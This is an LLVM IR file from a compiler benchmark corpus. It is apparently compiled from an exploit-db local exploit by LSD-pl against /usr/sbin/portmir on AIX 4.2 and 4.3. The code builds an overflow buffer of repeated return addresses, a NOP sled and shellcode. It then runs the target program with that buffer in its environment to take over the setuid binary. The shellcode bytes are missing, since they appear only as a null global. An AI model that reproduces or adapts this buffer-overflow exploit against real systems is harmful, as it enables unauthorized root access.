; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19306.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19306.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM oct 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c"/usr/sbin/portmir for aix 4.2 4.3 4.3.x PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"usage: %s 42|43|433\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@ALLIGN = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@.str.4 = private unnamed_addr constant [18 x i8] c"/usr/sbin/portmir\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-t\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [20000 x i8], align 16
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [2 x i8*], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  switch i32 %27, label %37 [
    i32 42, label %28
    i32 43, label %31
    i32 433, label %34
  ]

28:                                               ; preds = %23
  %29 = load i8*, i8** @shellcode, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 55
  store i8 2, i8* %30, align 1
  br label %39

31:                                               ; preds = %23
  %32 = load i8*, i8** @shellcode, align 8
  %33 = getelementptr inbounds i8, i8* %32, i64 55
  store i8 4, i8* %33, align 1
  br label %39

34:                                               ; preds = %23
  %35 = load i8*, i8** @shellcode, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 55
  store i8 3, i8* %36, align 1
  br label %39

37:                                               ; preds = %23
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %34, %31, %28
  store i32 0, i32* %12, align 4
  br label %40

40:                                               ; preds = %45, %39
  %41 = load i8**, i8*** %7, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i32 1
  store i8** %42, i8*** %7, align 8
  %43 = load i8*, i8** %41, align 8
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

45:                                               ; preds = %40
  %46 = load i8**, i8*** %7, align 8
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = add nsw i32 %48, 1
  %50 = load i32, i32* %12, align 4
  %51 = add nsw i32 %50, %49
  store i32 %51, i32* %12, align 4
  br label %40

52:                                               ; preds = %40
  %53 = load i8**, i8*** %7, align 8
  %54 = ptrtoint i8** %53 to i64
  %55 = load i32, i32* %12, align 4
  %56 = and i32 %55, -4
  %57 = sext i32 %56 to i64
  %58 = add i64 %54, %57
  %59 = sub i64 %58, 8000
  %60 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %61 = bitcast i8* %60 to i64*
  store i64 %59, i64* %61, align 1
  %62 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 1000
  %63 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8* %62, i8** %63, align 16
  %64 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 1
  store i8* null, i8** %64, align 8
  %65 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  store i8* %65, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %66

66:                                               ; preds = %78, %52
  %67 = load i32, i32* %12, align 4
  %68 = load i32, i32* @ALLIGN, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %81

70:                                               ; preds = %66
  %71 = load i32, i32* %12, align 4
  %72 = srem i32 %71, 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = load i8*, i8** %10, align 8
  %77 = getelementptr inbounds i8, i8* %76, i32 1
  store i8* %77, i8** %10, align 8
  store i8 %75, i8* %76, align 1
  br label %78

78:                                               ; preds = %70
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %66

81:                                               ; preds = %66
  store i32 0, i32* %12, align 4
  br label %82

82:                                               ; preds = %94, %81
  %83 = load i32, i32* %12, align 4
  %84 = load i32, i32* @ADRNUM, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %97

86:                                               ; preds = %82
  %87 = load i32, i32* %12, align 4
  %88 = srem i32 %87, 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = load i8*, i8** %10, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %10, align 8
  store i8 %91, i8* %92, align 1
  br label %94

94:                                               ; preds = %86
  %95 = load i32, i32* %12, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %12, align 4
  br label %82

97:                                               ; preds = %82
  %98 = load i8*, i8** %10, align 8
  store i8 0, i8* %98, align 1
  %99 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 1000
  store i8* %99, i8** %10, align 8
  %100 = load i8*, i8** %10, align 8
  %101 = call i32 @sprintf(i8* %100, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %102 = load i8*, i8** %10, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 4
  store i8* %103, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %104

104:                                              ; preds = %111, %97
  %105 = load i32, i32* %12, align 4
  %106 = load i32, i32* @ALLIGN, align 4
  %107 = icmp slt i32 %105, %106
  br i1 %107, label %108, label %114

108:                                              ; preds = %104
  %109 = load i8*, i8** %10, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 1
  store i8* %110, i8** %10, align 8
  store i8 32, i8* %109, align 1
  br label %111

111:                                              ; preds = %108
  %112 = load i32, i32* %12, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %12, align 4
  br label %104

114:                                              ; preds = %104
  store i32 0, i32* %12, align 4
  br label %115

115:                                              ; preds = %129, %114
  %116 = load i32, i32* %12, align 4
  %117 = load i32, i32* @NOPNUM, align 4
  %118 = icmp slt i32 %116, %117
  br i1 %118, label %119, label %132

119:                                              ; preds = %115
  %120 = load i32*, i32** @nop, align 8
  %121 = load i32, i32* %12, align 4
  %122 = srem i32 %121, 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i32, i32* %120, i64 %123
  %125 = load i32, i32* %124, align 4
  %126 = trunc i32 %125 to i8
  %127 = load i8*, i8** %10, align 8
  %128 = getelementptr inbounds i8, i8* %127, i32 1
  store i8* %128, i8** %10, align 8
  store i8 %126, i8* %127, align 1
  br label %129

129:                                              ; preds = %119
  %130 = load i32, i32* %12, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %12, align 4
  br label %115

132:                                              ; preds = %115
  store i32 0, i32* %12, align 4
  br label %133

133:                                              ; preds = %146, %132
  %134 = load i32, i32* %12, align 4
  %135 = load i8*, i8** @shellcode, align 8
  %136 = call i32 @strlen(i8* %135)
  %137 = icmp slt i32 %134, %136
  br i1 %137, label %138, label %149

138:                                              ; preds = %133
  %139 = load i8*, i8** @shellcode, align 8
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %139, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = load i8*, i8** %10, align 8
  %145 = getelementptr inbounds i8, i8* %144, i32 1
  store i8* %145, i8** %10, align 8
  store i8 %143, i8* %144, align 1
  br label %146

146:                                              ; preds = %138
  %147 = load i32, i32* %12, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %12, align 4
  br label %133

149:                                              ; preds = %133
  %150 = load i8*, i8** %10, align 8
  store i8 0, i8* %150, align 1
  %151 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  %152 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %153 = call i32 @execle(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %151, i32 0, i8** %152)
  %154 = load i32, i32* %4, align 4
  ret i32 %154
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
